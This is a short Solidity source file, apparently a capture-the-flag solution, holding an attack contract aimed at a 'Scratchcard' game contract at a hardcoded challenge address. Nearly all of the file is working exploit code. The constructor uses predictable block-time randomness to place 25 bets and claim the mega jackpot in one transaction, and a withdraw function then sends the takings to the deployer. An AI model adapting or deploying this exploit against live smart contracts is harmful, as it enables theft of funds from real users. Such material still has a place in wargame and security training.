pragma solidity 0.4.24;
//Challenge Address 0x505d51adcccb62cd33579c1ea7b94a717f7ae06e
//Attacker Address 0x43065950E0185BD74361D8580Daaa5BFF806aaDE
import "./Scratchcard.sol";

contract Attack2{
    address owner;
    Scratchcard game = Scratchcard(0x505d51adcccb62cd33579c1ea7b94a717f7ae06e);

    constructor() public payable {
        owner = tx.origin;
        uint val = (now%10**8)*10**10;
        for (uint i=0; i<25; i++) {
            game.play.value(val)();
        }
        game.collectMegaJackpot(2* val - 1);
    }

    function withdraw() public {
        if (msg.sender == owner) {
            msg.sender.transfer(address(this).balance); 
        }
    }

    function () public payable {}
}
